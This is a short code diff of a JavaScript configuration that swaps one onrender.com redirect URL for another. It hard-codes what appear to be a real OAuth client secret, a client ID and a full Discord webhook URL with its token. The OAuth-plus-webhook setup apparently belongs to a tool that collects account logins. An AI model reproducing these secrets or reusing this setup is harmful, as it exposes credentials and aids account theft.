@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = '9JN8Q~Wun_t7bUSTNk74VsLTQfPBo4bTWwpavcHe' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'bf93c632-be5e-43b8-a53e-85b4d79c79a3'
-const redirect_uri = 'https://oauth-blb2.onrender.com'
+const redirect_uri = 'https://noncydev.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
 
 //Requirements
